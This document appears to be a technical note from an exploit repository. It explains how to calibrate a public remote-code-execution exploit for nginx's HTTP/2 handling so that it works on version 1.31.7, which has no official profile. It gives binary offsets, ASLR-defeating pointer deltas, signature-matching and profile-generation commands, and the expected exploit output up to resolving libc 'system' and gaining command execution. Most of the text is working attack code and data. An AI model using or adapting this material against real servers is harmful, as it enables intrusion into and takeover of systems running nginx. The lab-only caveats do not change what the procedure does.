# 03 — Calibrating a version without an official profile

Rapid7's exploit ships two validated profiles (nginx 1.31.6 / 1.31.8, Debian
13 amd64). This note describes how we built a working profile for nginx
1.31.7, which has no official profile.

## Profile anatomy

```json
{
  "target": {
    "nginx_version": "1.31.8",
    "nginx_build_id": "955cb638...",
    "nginx_sha256": "f617a134...",
    "libc_sha256": "9792e3cb...",
    "openssl_runtime": "OpenSSL 3.5.7 ...",
    "worker_count": 4, "worker_connections": 1024,
    "http2_pool_size_bytes": 4096, "ssl_buffer_size_bytes": 16384, ...
  },
  "fingerprint": {
    "server_header": "nginx/1.31.8",
    "http2_settings": [[3,128],[4,65536],[5,16777215],[9,1]],
    "nginx_image_pointer_deltas": [0, -464, -13568],
    "http2_send_chain_delta": 139856,
    "resolver_timeout_delta": -310400,
    "destroy_pool_delta": -398896
  },
  "transport": { "negative_distance": 14392, "release_increment": 14393, ... },
  "heap": { "holder_value_bytes": 5135, "address_disclosure": { ... }, ... }
}
```

Only the nginx-image deltas depend directly on the nginx binary layout:

- `nginx_image_pointer_deltas`: locates a PIE anchor from three relative
  handler pointers found in leaked memory (`[0, -464, -13568]`);
- `http2_send_chain_delta`: anchor + delta = the fake connection's
  `send_chain` address;
- `resolver_timeout_delta`: anchor + delta = the handler used for deferred
  execution;
- `destroy_pool_delta`: anchor + delta = `ngx_destroy_pool`, used during
  reclaim.

The heap/transport fields depend on nginx pool layout and protocol timing.
Between 1.31.6 and 1.31.8, everything relevant to our target matched except
`negative_distance` (13,880 vs 14,392). For 1.31.7 we reused the 1.31.8
values and they held (first disclosure 14,393 bytes, second 200,929 bytes).

## Procedure

### 1. Extract and identify the target binaries

```sh
docker cp <container>:/usr/sbin/nginx  ./nginx-new
docker cp <container>:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
nginx -v
sha256sum nginx-new libc.so.6
readelf -n nginx-new | grep 'Build ID'
readelf -n libc.so.6 | grep 'Build ID'
```

The official image binary is stripped (`.gnu_debuglink` only, no `.symtab`),
so symbol-based offset recovery isn't available.

### 2. Confirm the runtime fingerprint

- `server` header (`nginx/1.31.7`) from an HTTP/2 response;
- TLS 1.3 + ALPN `h2`;
- HTTP/2 SETTINGS (`[[3,128],[4,65536],[5,16777215],[9,1]]` for both 1.31.7
  and 1.31.8);
- static resource behavior: `/index.html` 896 bytes, `Range: bytes=0-9`
  returns 206 with `content-range: bytes 0-9/896` and a 10-byte body.

`tools/probe_h2_settings.py` prints TLS/ALPN and the SETTINGS list.

### 3. Find the anchor in the known binary

First validate the delta semantics on the known 1.31.8 binary: a candidate
anchor `A` must have `A`, `A-464`, `A-13568` as function entries, and
`A+139856`, `A-310400`, `A-398896` as function entries/code. Scanning the
executable segment gives a single candidate:

```text
$ python3 tools/scan_nginx_deltas.py nginx-1.31.8 --profile $RAPID7_PROFILE
anchor 0x98840
  delta        0 -> 0x98840  start=yes
  delta     -464 -> 0x98670  start=yes
  delta   -13568 -> 0x95340  start=yes
  delta  +139856 -> 0xbaa90  start=yes
  delta -310400 -> 0x4cbc0  start=yes
  delta -398896 -> 0x37210  start=yes
```

### 4. Find the anchor in the new binary

The same `[0,-464,-13568]` relation on 1.31.7 also gives a unique candidate:

```text
anchor 0x98940
  delta        0 -> 0x98940
  delta     -464 -> 0x98770
  delta   -13568 -> 0x95440
```

(The anchor moved by +0x100; the three handlers kept their relative
distances.)

### 5. Map the remaining functions by byte signature

The stripped binary still contains the function code. Take the first 48–96
bytes of each known function from the old binary and search the new binary's
executable segment:

| Function | 1.31.8 vaddr | 1.31.7 vaddr | Shift | Match |
|---|---|---|---|---|
| anchor (handler) | `0x98840` | `0x98940` | +0x100 | 96-byte exact |
| handler-1 | `0x98670` | `0x98770` | +0x100 | 48-byte exact |
| handler-2 | `0x95340` | `0x95440` | +0x100 | via delta relation (code changed) |
| `ngx_http_v2_send_chain` | `0xbaa90` | `0xbac10` | +0x180 | 96-byte exact |
| resolver timeout handler | `0x4cbc0` | `0x4cb40` | -0x80 | 64-byte exact |
| `ngx_destroy_pool` | `0x37210` | `0x37150` | -0xC0 | 64-byte exact |

`tools/match_nginx_functions.py` automates the signature search and prints
the delta table.

### 6. Compute the new deltas

```text
send_chain     0xbac10 - 0x98940 = 139984   (was  139856)
resolver       0x4cb40 - 0x98940 = -310784  (was -310400)
destroy_pool   0x37150 - 0x98940 = -399344  (was -398896)
triple         [0, -464, -13568]            (unchanged)
```

### 7. Generate and validate the profile

```sh
python3 tools/make_profile.py \
  --base $RAPID7_PROFILE \
  --nginx nginx-1.31.7 \
  --libc libc.so.6 \
  --name local-nginx-1.31.7-debian13-amd64 \
  --send-chain-delta 139984 \
  --resolver-timeout-delta -310784 \
  --destroy-pool-delta -399344 \
  --out profiles/local-nginx-1.31.7-debian13-amd64.json

python exploit/profiles/profile_tool.py validate \
  exploit/profiles/local-nginx-1.31.7-debian13-amd64.json
```

`make_profile.py` pulls identity fields from the binaries (version, build-id,
SHA-256, libc identity) and keeps the base profile's heap/transport fields.
It marks the profile unvalidated by default; after an end-to-end oracle
passes in your lab, `--mark-validated` flips it (only do this in your own
lab).

### 8. End-to-end verification

Run the public exploit against a freshly restarted target with the local
profile. Success looks like:

```text
runtime HTTP profile: ... candidates=local-nginx-1.31.7-debian13-amd64
captured 14393-byte memory disclosure; resolving ASLR
ASLR resolved: ... profile=local-nginx-1.31.7-debian13-amd64
address disclosure capture: wire_bytes=200929
address-directed libc symbols resolved in-band: system=0x...
late target-owned execution record installed; releasing final response byte
```

Then verify the marker outside the exploit, e.g. inside the container:

```text
uid=101 gid=101 mode=644 size=14
content: redacted
```

## Pitfalls

- Different libc (hash/build-id): don't reuse libc fields; recalibrate the
  memcpy offset, arena offsets and `system` resolution.
- Different heap layout (nginx code changes affecting pools): tune
  `transport.negative_distance`, `disclosure_frame_bytes` and the heap
  grooming fields, and verify each stage (first leak → reclaim → second
  leak).
- Unstable anchor: if the handlers changed too much, signature matching can
  fail; disassemble the candidates or rebuild nginx with matching configure
  flags.
- Don't fake validation: `validated` should mean an end-to-end
  command-execution oracle actually passed in your environment.
